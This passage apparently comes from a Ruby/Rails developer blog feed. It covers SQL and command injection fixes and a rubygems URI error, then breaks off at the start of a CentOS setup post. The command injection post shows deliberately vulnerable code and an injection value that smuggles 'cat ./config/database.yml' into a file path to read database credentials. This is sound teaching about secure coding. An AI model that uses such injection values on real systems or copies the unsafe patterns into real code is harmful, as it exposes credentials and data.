<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># Unsafe</span>
</span><span class='line'><span class="k">def</span> <span class="nf">unsafe_query</span>
</span><span class='line'>  <span class="n">sql</span> <span class="o">=</span> <span class="o">[]</span>
</span><span class='line'>  <span class="n">sql</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;email = </span><span class="si">#{</span><span class="n">email</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">if</span> <span class="n">condition1?</span>
</span><span class='line'>  <span class="n">sql</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;name = </span><span class="si">#{</span><span class="nb">name</span><span class="si">}</span><span class="s2">&quot;</span>   <span class="k">if</span> <span class="n">condition2?</span>
</span><span class='line'>  <span class="c1"># ... etc</span>
</span><span class='line'>
</span><span class='line'>  <span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="n">sql</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39; OR &#39;</span><span class="p">))</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Safe</span>
</span><span class='line'><span class="k">def</span> <span class="nf">safe_query</span>
</span><span class='line'>  <span class="n">sql</span>   <span class="o">=</span> <span class="o">[]</span>
</span><span class='line'>  <span class="n">param</span> <span class="o">=</span> <span class="o">[]</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="n">condition1?</span>
</span><span class='line'>    <span class="n">sql</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;email = ?&quot;</span>
</span><span class='line'>    <span class="n">param</span> <span class="o">&lt;&lt;</span> <span class="n">email</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="n">condition2?</span>
</span><span class='line'>    <span class="n">sql</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;name = ?&quot;</span>
</span><span class='line'>    <span class="n">param</span> <span class="o">&lt;&lt;</span> <span class="nb">name</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="n">sql</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39; OR &#39;</span><span class="p">),</span> <span class="o">*</span><span class="n">param</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>While not very pretty, notice that the parameters are passed in separately from the query. This way
parameterization can still occur keeping you safe from SQL Injection.
There are <a href="http://stackoverflow.com/a/31096106/33226">ways to pretty this up</a> which I&rsquo;d encourage you to
use if this type of code is in your code base.</p>

<h3>LIKE Query</h3>

<p>Another common scenario is doing a <a href="http://www.w3schools.com/sql/sql_like.asp">starts with/ends with</a> filter
using <code>LIKE</code>. This query is more apt to introduce SQL injection because many people don&rsquo;t understand how
it works!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># Unsafe</span>
</span><span class='line'><span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="s2">&quot;email LIKE &#39;%</span><span class="si">#{</span><span class="n">partial_email</span><span class="si">}</span><span class="s2">%&#39;&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Safe</span>
</span><span class='line'><span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="s2">&quot;email LIKE ?&quot;</span><span class="p">,</span> <span class="s2">&quot;%</span><span class="si">#{</span><span class="n">partial_email</span><span class="si">}</span><span class="s2">%&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Notice that with both queries, you&rsquo;re going to have to do some string interpolation to insert the <code>%</code> signs.
You&rsquo;ll want to make sure that this occurs inside the value that will be parameterized.</p>

<h3>Raw Queries</h3>

<p>The final common scenario is raw queries. These are queries where you need to get right into the SQL itself
without using ActiveRecord or any other type of framework.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># Unsafe</span>
</span><span class='line'><span class="n">st</span> <span class="o">=</span> <span class="ss">ActiveRecord</span><span class="p">:</span><span class="ss">:Base</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">raw_connection</span><span class="o">.</span><span class="n">prepare</span><span class="p">(</span>
</span><span class='line'>  <span class="s2">&quot;select * from users where email = &#39;</span><span class="si">#{</span><span class="n">email</span><span class="si">}</span><span class="s2">&#39;&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">results</span> <span class="o">=</span> <span class="n">st</span><span class="o">.</span><span class="n">execute</span>
</span><span class='line'><span class="n">st</span><span class="o">.</span><span class="n">close</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Safe</span>
</span><span class='line'><span class="n">st</span> <span class="o">=</span> <span class="ss">ActiveRecord</span><span class="p">:</span><span class="ss">:Base</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">raw_connection</span><span class="o">.</span><span class="n">prepare</span><span class="p">(</span>
</span><span class='line'>  <span class="s2">&quot;select * from users where email = ?&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">results</span> <span class="o">=</span> <span class="n">st</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">email</span><span class="p">)</span>
</span><span class='line'><span class="n">st</span><span class="o">.</span><span class="n">close</span>
</span></code></pre></td></tr></table></div></figure>


<p>The above query is too simple for a raw query, you&rsquo;d normally be doing a complex query, but at least now
you can see proper parameterization. Raw queries follow in the same footsteps as previous examples of query
parameterization.</p>

<p>That wraps up this post on SQL Injection. I hope that you learned something new. If there&rsquo;s a Ruby or Rails
security topic that you&rsquo;d like me to touch on send me a <a href="https://twitter.com/gavingmiller">tweet</a> or an
<a href="mailto:me@gavinmiller.io" target="_blank">email</a>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Fixing Command Injection Vulnerabilities in Ruby/Rails]]></title>
    <link href="http://gavinmiller.io/2015/fixing-command-injection-vulnerabilities/">
    <updated>2015-09-19T14:11:00-06:00</updated>
    <id>http://gavinmiller.io/2015/fixing-command-injection-vulnerabilities</id>
    <content type="html"><![CDATA[<p>This post details what a Command Injection vulnerabilitiy is, why you need to fix them, and how to fix
them!</p>

<h2>What is a Command Injection Vulnerability?</h2>

<p>Command Injection is one of the worst types of security vulnerabilities that you can have within your system.
It&rsquo;s one part of a larger umbrella of vulnerabilities known as Injection vulnerabilities. Injection
vulnerabilities have taken the #1 spot on the OWASP Top 10 in both
<a href="https://www.owasp.org/index.php/Top_10_2010-A1">2010</a> and
<a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection">2013</a>.</p>

<p>*<em>Using my best John Oliver voice</em>*: Not something to be proud of Injection!</p>

<p><img src="http://gavinmiller.io/images/command_injection/injection-john-oliver.png" alt="John Oliver yelling at an image that reads: Injection #1 in 2010 and 2013" /></p>

<p>Command Injection looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">path</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">#{</span><span class="no">Rails</span><span class="o">.</span><span class="n">root</span><span class="si">}</span><span class="s2">/public/downloads/</span><span class="si">#{</span><span class="n">user_supplied_path</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span class='line'><span class="sb">`ls </span><span class="si">#{</span><span class="n">path</span><span class="si">}</span><span class="sb">`</span>
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s all that is required for an attacker to gain full access to your system. In such a case all of your
data could be stolen, modified, or deleted. Not code that you want to be responsible for writing!</p>

<p>So how does an attacker leverage this code? Since the user is able to provide <code>user_supplied_path</code> they
could do this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">user_supplied_path</span> <span class="o">=</span> <span class="s1">&#39;; cat ./config/database.yml&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">path</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">#{</span><span class="no">Rails</span><span class="o">.</span><span class="n">root</span><span class="si">}</span><span class="s2">/public/downloads/</span><span class="si">#{</span><span class="n">user_supplied_path</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span class='line'><span class="sb">`ls </span><span class="si">#{</span><span class="n">path</span><span class="si">}</span><span class="sb">`</span>  <span class="c1">#=&gt; ls /webserver/public/downloads; cat ./config/database.yml</span>
</span></code></pre></td></tr></table></div></figure>


<p>This gives the attacker full access to the details of your database. At this point, your company goes bankrupt,
you lose your job, and you stub your toe on the way out of your office. It&rsquo;s a terrible day!</p>

<p>Let&rsquo;s fix it.</p>

<h2>How to Fix Command Injection Vulnerabilities in Rails/Ruby</h2>

<p>There are multiple formats that a Command Injection vulnerability can come in based upon the system
call that you&rsquo;re making. Here&rsquo;s some examples:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># All the below commands are unsafe!!</span>
</span><span class='line'>
</span><span class='line'><span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ls -a -l -@ -1 </span><span class="si">#{</span><span class="n">path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>                  <span class="c1"># System</span>
</span><span class='line'><span class="sb">`ls </span><span class="si">#{</span><span class="n">params</span><span class="o">[</span><span class="ss">:dir</span><span class="o">]</span><span class="si">}</span><span class="sb"> &amp;2&gt;1`</span>                         <span class="c1"># Backtick</span>
</span><span class='line'><span class="sx">%x(ls </span><span class="si">#{</span><span class="n">params</span><span class="o">[</span><span class="ss">:dir</span><span class="o">]</span><span class="si">}</span><span class="sx">)</span>                            <span class="c1"># %x</span>
</span><span class='line'><span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;md5sum </span><span class="si">#{</span><span class="n">params</span><span class="o">[</span><span class="ss">:input</span><span class="o">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>                  <span class="c1"># Exec</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Open3</span>
</span><span class='line'><span class="no">Open3</span><span class="o">.</span><span class="n">capture2</span><span class="p">(</span><span class="s2">&quot;ls </span><span class="si">#{</span><span class="n">params</span><span class="o">[</span><span class="ss">:file</span><span class="o">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>             <span class="c1"># capture2</span>
</span><span class='line'><span class="no">Open3</span><span class="o">.</span><span class="n">capture2e</span><span class="p">(</span><span class="s2">&quot;curl -fsSL </span><span class="si">#{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>              <span class="c1"># capture2e</span>
</span><span class='line'><span class="no">Open3</span><span class="o">.</span><span class="n">capture3</span><span class="p">(</span><span class="s2">&quot;curl -fsSL </span><span class="si">#{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>               <span class="c1"># capture3</span>
</span></code></pre></td></tr></table></div></figure>


<p>There are tons of commands that you could be using and <em>thankfully</em> they all follow the same pattern
for properly protecting them from Command Injection.</p>

<p><strong>To safely protect from Command Injection, call your command by breaking each piece into a seperate string</strong>.
Here&rsquo;s an example:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ls -a -l -@ -1 </span><span class="si">#{</span><span class="n">path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Fixed</span>
</span><span class='line'><span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ls&quot;</span><span class="p">,</span> <span class="s2">&quot;-a&quot;</span><span class="p">,</span> <span class="s2">&quot;-l&quot;</span><span class="p">,</span> <span class="s2">&quot;-@&quot;</span><span class="p">,</span> <span class="s2">&quot;-1&quot;</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s it. Really simple! Now there are a few special cases that you&rsquo;re going to run into, so let&rsquo;s look at
those.</p>

<h4>Backtick (`) method</h4>

<p>The backtick method is handled in a different way when writing system commands. Namely you cannot provide
it multiple arguments. So instead when faced with command injection for backtick, you&rsquo;ll need to use another
method like <code>system</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="sb">`ls -a -l -@ -1 </span><span class="si">#{</span><span class="n">path</span><span class="si">}</span><span class="sb">`</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Fixed</span>
</span><span class='line'><span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ls&quot;</span><span class="p">,</span> <span class="s2">&quot;-a&quot;</span><span class="p">,</span> <span class="s2">&quot;-l&quot;</span><span class="p">,</span> <span class="s2">&quot;-@&quot;</span><span class="p">,</span> <span class="s2">&quot;-1&quot;</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Output Redirection</h4>

<p>Output redirection is another special cases. Let&rsquo;s say you&rsquo;ve got a command like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="sb">`ls -a -l -@ -1 </span><span class="si">#{</span><span class="n">path</span><span class="si">}</span><span class="sb"> 2&gt;&amp;1`</span>
</span></code></pre></td></tr></table></div></figure>


<p>Simple enough you think, and you change the backtick method to <code>system</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ls&quot;</span><span class="p">,</span> <span class="s2">&quot;-a&quot;</span><span class="p">,</span> <span class="s2">&quot;-l&quot;</span><span class="p">,</span> <span class="s2">&quot;-@&quot;</span><span class="p">,</span> <span class="s2">&quot;-1&quot;</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="s2">&quot;2&gt;&amp;1&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The problem is you&rsquo;re going to run into an error like this:</p>

<blockquote><p>ls 2>&amp;1: No such file or directory</p></blockquote>

<p>This is because the system command now thinks that <code>2&gt;&amp;1</code> is a part of the arguments to <code>ls</code> and not
an output redirection.</p>

<p>To fix this, you&rsquo;re going to have to use a command from the <a href="http://ruby-doc.org/stdlib-2.1.0/libdoc/open3/rdoc/Open3.html"><code>Open3</code></a>
library to properly handle output redirection. Because you&rsquo;re using <code>2&gt;&amp;1</code> &ndash; which means redirecting
<code>stderr</code> to <code>stdout</code> &ndash; you&rsquo;re going to use <code>capture2e</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;open3&#39;</span>
</span><span class='line'><span class="n">stdout_and_stderr</span><span class="p">,</span> <span class="n">status</span> <span class="o">=</span> <span class="no">Open3</span><span class="o">.</span><span class="n">capture2e</span><span class="p">(</span><span class="s2">&quot;ls&quot;</span><span class="p">,</span> <span class="s2">&quot;-a&quot;</span><span class="p">,</span> <span class="s2">&quot;-l&quot;</span><span class="p">,</span> <span class="s2">&quot;-@&quot;</span><span class="p">,</span> <span class="s2">&quot;-1&quot;</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>And don&rsquo;t forget to <code>require 'open3'</code> otherwise you&rsquo;ll get:</p>

<blockquote><p>NameError: uninitialized constant Open3</p></blockquote>

<h4>Logging</h4>

<p>One pattern that I&rsquo;ve seen is logging before running a system command like so:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">cmd</span> <span class="o">=</span> <span class="s2">&quot;ls -a -l -@ -1 </span><span class="si">#{</span><span class="n">path</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span class='line'><span class="no">Rails</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;Running: </span><span class="si">#{</span><span class="n">cmd</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="sb">`cmd`</span>
</span></code></pre></td></tr></table></div></figure>


<p>I like to use the <a href="https://endofline.wordpress.com/2011/01/21/the-strange-ruby-splat/"><code>splat</code></a>
operator to simplfy the above to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">cmd</span> <span class="o">=</span> <span class="o">[</span><span class="s2">&quot;ls&quot;</span><span class="p">,</span> <span class="s2">&quot;-a&quot;</span><span class="p">,</span> <span class="s2">&quot;-l&quot;</span><span class="p">,</span> <span class="s2">&quot;-@&quot;</span><span class="p">,</span> <span class="s2">&quot;-1&quot;</span><span class="p">,</span> <span class="n">path</span><span class="o">]</span>
</span><span class='line'><span class="no">Rails</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;Running: </span><span class="si">#{</span><span class="n">cmd</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="nb">system</span><span class="p">(</span><span class="o">*</span><span class="n">cmd</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<h4>File Access Vulnerabilities</h4>

<p>One big caveat with all of the above is that there is still potential for abuse. Let&rsquo;s say you&rsquo;ve got
the following command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">system</span><span class="p">(</span><span class="s2">&quot;cat&quot;</span><span class="p">,</span> <span class="n">user_supplied_path</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The above is a type of <a href="http://gavinmiller.io/2015/fixing-file-access-vulnerabilities-in-ruby-and-rails">File Access vulnerability</a>
and <strong>brakeman isn&rsquo;t going to recognize it!</strong></p>

<p>In this case you&rsquo;d want to switch to a Ruby built in command like <code>File.read</code> to grab the contents of the file, and make sure to sanitize the payload.  Just remember to be
careful that you don&rsquo;t create a new vulnerability when fixing an old one!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[bad URI(is not URI?): (URI::InvalidURIError)]]></title>
    <link href="http://gavinmiller.io/2015/bad-uri-is-not-uri/">
    <updated>2015-09-07T16:21:00-06:00</updated>
    <id>http://gavinmiller.io/2015/bad-uri-is-not-uri</id>
    <content type="html"><![CDATA[<p>In this post, I examine <code>a bad URI(is not URI?)</code> error that I received while running <code>gem install</code> and dive
into the rubygems source code to diagnose the issue.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">bad</span> <span class="no">URI</span><span class="p">(</span><span class="n">is</span> <span class="ow">not</span> <span class="no">URI</span><span class="sc">?)</span><span class="p">:</span>  <span class="p">(</span><span class="ss">URI</span><span class="p">:</span><span class="ss">:InvalidURIError</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>I stumbled across the above error a number of times at work when running <code>gem install</code>. It was nothing short of
frustrating since every time I did a search for the string I came up with nothing related to rubygems or
the gem command. Here&rsquo;s the full stacktrace:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">/uri</span><span class="o">/</span><span class="n">common</span><span class="o">.</span><span class="n">rb</span><span class="p">:</span><span class="mi">176</span><span class="ss">:in</span> <span class="sb">`split&#39;: bad URI(is not URI?):  (URI::InvalidURIError)</span>
</span><span class='line'><span class="sb">.../uri/common.rb:212:in `</span><span class="n">parse</span><span class="s1">&#39;</span>
</span><span class='line'><span class="s1">.../uri/common.rb:748:in `parse&#39;</span>
</span><span class='line'><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">/rubygems</span><span class="o">/</span><span class="n">source_list</span><span class="o">.</span><span class="n">rb</span><span class="p">:</span><span class="mi">58</span><span class="ss">:in</span> <span class="sb">`&lt;&lt;&#39;</span>
</span><span class='line'><span class="sb">.../rubygems/source_list.rb:73:in `</span><span class="n">block</span> <span class="k">in</span> <span class="n">replace</span><span class="s1">&#39;</span>
</span><span class='line'><span class="s1">.../rubygems/source_list.rb:72:in `each&#39;</span>
</span><span class='line'><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">/rubygems</span><span class="o">/</span><span class="n">source_list</span><span class="o">.</span><span class="n">rb</span><span class="p">:</span><span class="mi">72</span><span class="ss">:in</span> <span class="sb">`replace&#39;</span>
</span><span class='line'><span class="sb">.../rubygems/source_list.rb:38:in `</span><span class="n">from</span><span class="s1">&#39;</span>
</span><span class='line'><span class="s1">.../rubygems.rb:867:in `sources=&#39;</span>
</span><span class='line'><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">/rubygems</span><span class="o">/</span><span class="n">config_file</span><span class="o">.</span><span class="n">rb</span><span class="p">:</span><span class="mi">225</span><span class="ss">:in</span> <span class="sb">`initialize&#39;</span>
</span><span class='line'><span class="sb">.../rubygems/gem_runner.rb:74:in `</span><span class="kp">new</span><span class="s1">&#39;</span>
</span><span class='line'><span class="s1">.../rubygems/gem_runner.rb:74:in `do_configuration&#39;</span>
</span><span class='line'><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">/rubygems</span><span class="o">/</span><span class="n">gem_runner</span><span class="o">.</span><span class="n">rb</span><span class="p">:</span><span class="mi">39</span><span class="ss">:in</span> <span class="sb">`run&#39;</span>
</span><span class='line'><span class="sb">.../bin/gem:22:in `</span><span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;</span><span class="err">&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Since Google wasn&rsquo;t going to solve the problem for me, I had to jump into the source code myself to address
the issue. It took running through the rubygems code to actually discover that problem was how <code>sources</code> was
defined.</p>

<h2>How does rubygems define sources?</h2>

<p>In ruby gems there are multiple ways to define sources. The first is the most basic, the <a href="https://github.com/rubygems/rubygems/blob/ae1718fd2d0e238940c38d56e32c56bffe083894/lib/rubygems/defaults.rb#L13-L15">default gem source is https://rubygems.org</a>.</p>

<p>The second way to <a href="https://github.com/rubygems/rubygems/blob/ae1718fd2d0e238940c38d56e32c56bffe083894/lib/rubygems/config_file.rb#L225">set your gem sources is via a <code>gemrc</code> file</a>.
The gemrc file can be defined in 3 different locations:</p>

<ul>
<li>system wide <code>/etc/gemrc</code></li>
<li>per user <code>~/.gemrc</code></li>
<li>per environment (gemrc files listed in <code>GEMRC</code> environment variable)</li>
</ul>


<p>The final place where <a href="https://github.com/rubygems/rubygems/blob/ae1718fd2d0e238940c38d56e32c56bffe083894/lib/rubygems/request_set/gem_dependency_api.rb#L774-L794">gem sources can be defined is in bundler</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">source</span> <span class="s2">&quot;http://rubygems.org&quot;</span>
</span><span class='line'><span class="n">source</span> <span class="s2">&quot;http://my-private-gemstore.com&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">gem</span> <span class="s1">&#39;sinatra&#39;</span>
</span><span class='line'><span class="n">gem</span> <span class="s1">&#39;rake&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># etc ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>By going through the various locations for defining sources above, I was able to find a gemrc file that was
missing an entry for sources:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="o">---</span>
</span><span class='line'><span class="ss">:sources</span><span class="p">:</span>
</span><span class='line'><span class="o">-</span>          <span class="c1"># should be https://rubygems.org</span>
</span></code></pre></td></tr></table></div></figure>


<p>By filling in the blank item under sources to <a href="https://rubygems.org,">https://rubygems.org,</a> my problem was resolved.</p>

<h2>Why not use RubyGems as the only source?</h2>

<p>If you&rsquo;re newer to ruby, or have never used a private gem repo you&rsquo;re probably asking why allow multiple source
definitions?</p>

<p>Let&rsquo;s look at the historical side. Back in the day there used to multiple sources of gems. As
the ruby community aged these sites either migrated to rubygems.org or shutdown altogether. In cronological
order:</p>

<ul>
<li><em>gemcutter.org</em> transitioned to <a href="http://web.archive.org/web/20091029234057/http://update.gemcutter.org/2009/09/25/kinetic-energy.html">RubyGems.org in ~2009</a></li>
<li><em>gems.github.com</em> <a href="https://github.com/blog/515-gem-building-is-defunct">shutdown in ~Oct 2010</a></li>
<li><em>gems.rubyforge.org</em> sunsetted on <a href="https://twitter.com/evanphx/status/399552820380053505">May 15, 2014</a></li>
</ul>


<p>Prior to consolidation, you&rsquo;d need to define all the sources that you were pulling your gems from. This is one
reason why you&rsquo;re able to define multiple sources today.</p>

<p>The second reason that you can define multiple sources for ruby gems is private gem repos. Private repos are a
way to privately host gems without giving access to the outside world. There are various use cases for this:
ip restrictions, security considerations, etc. which is why you or your company might do this.</p>

<p>If you&rsquo;re interested, there are a couple of ways to host your gems privately via:</p>

<ul>
<li><a href="https://github.com/geminabox/geminabox">Gem In A Box</a></li>
<li><a href="https://gemfury.com/l/gem-server">Gem Fury</a></li>
<li><a href="http://stackoverflow.com/a/13261333/33226">GitHub</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Setting Up CentOS 6.2 Minimal on VMWare Fusion]]></title>
    <link href="http://gavinmiller.io/2015/setting-up-centos-6-dot-2-minimal-on-vmware-fusion/">
    <updated>2015-08-02T10:52:00-06:00</updated>
    <id>http://gavinmiller.io/2015/setting-up-centos-6-dot-2-minimal-on-vmware-fusion</id>
    <content type="html"><![CDATA[<p>Below are the steps required to get CentOS 6.2 Minimal installed within a VMWare Fusion virtual machine.
